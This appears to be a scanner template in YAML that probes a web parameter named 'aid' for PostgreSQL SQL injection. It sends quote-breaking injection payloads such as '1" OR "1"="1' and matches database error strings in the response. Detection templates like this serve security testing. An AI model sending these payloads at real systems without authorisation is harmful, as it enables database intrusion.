id: sqli3-pg-14
name: 'SQLi pg prefix #13 in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - '1" OR "1"="1'
        - '''))'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
